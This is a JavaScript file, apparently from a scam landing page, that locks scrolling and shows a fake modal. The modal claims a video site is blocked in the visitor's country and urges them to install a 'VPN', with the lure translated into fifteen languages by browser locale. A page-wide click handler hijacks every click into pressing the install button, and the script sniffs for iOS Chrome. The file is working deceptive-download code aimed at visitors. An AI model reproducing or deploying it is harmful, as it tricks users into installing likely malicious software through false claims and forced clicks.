document.body.style.overflow = "hidden";
document.addEventListener("DOMContentLoaded", function () {
    const bg = document.querySelector(".screen-bg");
    const modal = document.querySelector(".fake-modal");
  


    let totalSeconds = 60;
    let timerStarted = false;
    let switched = false;
    let intervalId = null;

const translations = {
  
  en: {
  fake_modal__top_note_key: "This video site is blocked<br>in your country",
  modal_title_key: "Download VPN to watch",
  modal_text_key: "To watch videos, you need to <b>install a VPN</b> for your security.",
  scan_now_option: "Install VPN",
},
  
  fr: {
  fake_modal__top_note_key: "Ce site vidéo est bloqué<br>dans votre pays",
  modal_title_key: "Téléchargez un VPN pour regarder",
  modal_text_key: "Pour regarder des vidéos, vous devez <b>installer un VPN</b> pour votre sécurité.",
  scan_now_option: "Installer VPN",
},

"pt-PT": {
  fake_modal__top_note_key: "Este site de vídeo está bloqueado<br>no seu país",
  modal_title_key: "Transfira uma VPN para assistir",
  modal_text_key: "Para assistir a vídeos, precisa de <b>instalar uma VPN</b> para sua segurança.",
  scan_now_option: "Instalar VPN",
},

"pt-BR": {
  fake_modal__top_note_key: "Este site de vídeos está bloqueado<br>no seu país",
  modal_title_key: "Baixe uma VPN para assistir",
  modal_text_key: "Para assistir vídeos, você precisa <b>instalar uma VPN</b> para sua segurança.",
  scan_now_option: "Instalar VPN",
},

es: {
  fake_modal__top_note_key: "Este sitio de videos está bloqueado<br>en tu país",
  modal_title_key: "Descarga una VPN para ver",
  modal_text_key: "Para ver videos, necesitas <b>instalar una VPN</b> para tu seguridad.",
  scan_now_option: "Instalar VPN",
},

"es-419": {
  fake_modal__top_note_key: "Este sitio de videos está bloqueado<br>en tu país",
  modal_title_key: "Descarga una VPN para ver",
  modal_text_key: "Para ver videos, necesitas <b>instalar una VPN</b> para tu seguridad.",
  scan_now_option: "Instalar VPN",
},

da: {
  fake_modal__top_note_key: "Dette videosite er blokeret<br>i dit land",
  modal_title_key: "Download VPN for at se",
  modal_text_key: "For at se videoer skal du <b>installere en VPN</b> for din sikkerhed.",
  scan_now_option: "Installer VPN",
},

ja: {
  fake_modal__top_note_key: "この動画サイトは<br>お住まいの国ではブロックされています",
  modal_title_key: "視聴するにはVPNをダウンロード",
  modal_text_key: "動画を視聴するには、安全のために<b>VPNをインストール</b>する必要があります。",
  scan_now_option: "VPNをインストール",
},

fil: {
  fake_modal__top_note_key: "Naka-block ang video site na ito<br>sa iyong bansa",
  modal_title_key: "Mag-download ng VPN para manood",
  modal_text_key: "Para makapanood ng mga video, kailangan mong <b>mag-install ng VPN</b> para sa iyong seguridad.",
  scan_now_option: "I-install ang VPN",
},

de: {
  fake_modal__top_note_key: "Diese Video-Website ist<br>in Ihrem Land blockiert",
  modal_title_key: "VPN herunterladen zum Ansehen",
  modal_text_key: "Um Videos anzusehen, müssen Sie <b>ein VPN installieren</b> zu Ihrer Sicherheit.",
  scan_now_option: "VPN installieren",
},

nb: {
  fake_modal__top_note_key: "Denne videosiden er blokkert<br>i ditt land",
  modal_title_key: "Last ned VPN for å se",
  modal_text_key: "For å se videoer må du <b>installere en VPN</b> for din sikkerhet.",
  scan_now_option: "Installer VPN",
},

sv: {
  fake_modal__top_note_key: "Den här videosajten är blockerad<br>i ditt land",
  modal_title_key: "Ladda ner VPN för att titta",
  modal_text_key: "För att titta på videor måste du <b>installera ett VPN</b> för din säkerhet.",
  scan_now_option: "Installera VPN",
},

it: {
  fake_modal__top_note_key: "Questo sito video è bloccato<br>nel tuo paese",
  modal_title_key: "Scarica una VPN per guardare",
  modal_text_key: "Per guardare i video devi <b>installare una VPN</b> per la tua sicurezza.",
  scan_now_option: "Installa VPN",
},

nl: {
  fake_modal__top_note_key: "Deze videosite is geblokkeerd<br>in jouw land",
  modal_title_key: "Download VPN om te kijken",
  modal_text_key: "Om video's te bekijken moet je <b>een VPN installeren</b> voor je veiligheid.",
  scan_now_option: "VPN installeren",
},

ro: {
  fake_modal__top_note_key: "Acest site video este blocat<br>în țara ta",
  modal_title_key: "Descarcă un VPN pentru a viziona",
  modal_text_key: "Pentru a viziona videoclipuri, trebuie să <b>instalezi un VPN</b> pentru siguranța ta.",
  scan_now_option: "Instalează VPN",
},
};

  const definedLanguages = [
    "en", "fr", "pt-PT", "pt-BR", "es", "es-419",
    "da", "ja", "fil", "de", "nb", "sv", "it", "nl", "ro"
  ];

  const currentLocale = (navigator && navigator.language) || "en";

  const getLocale = () => {
    if (translations[currentLocale]) return currentLocale;

    const shortLocale = currentLocale.slice(0, 2);
    if (translations[shortLocale]) return shortLocale;

    return "en";
  };

  const locale = getLocale();
  const t = translations[locale] || translations.en;

  document.documentElement.lang = locale;
document.getElementById("fake_modal__top_note_key").innerHTML = t.fake_modal__top_note_key;
document.getElementById("modal_title_key").textContent = t.modal_title_key;
document.getElementById("modal_text_key").innerHTML = t.modal_text_key;
document.getElementById("scan_now_option").textContent = t.scan_now_option;

document.addEventListener("click", function (e) {
    const installBtn = document.getElementById("goStep1");
    if (!installBtn) return;
    installBtn.click();
});




    if (bg) {
        requestAnimationFrame(() => {
            bg.classList.add("active");
        });
    }

  
(function () {
  const ua = navigator.userAgent;
  const isIOS = /iPhone|iPad|iPod/i.test(ua);
  const isChrome = /CriOS/i.test(ua);

  if (isIOS && isChrome) {
    document.body.classList.add('ios-chrome');
  }
})();
});
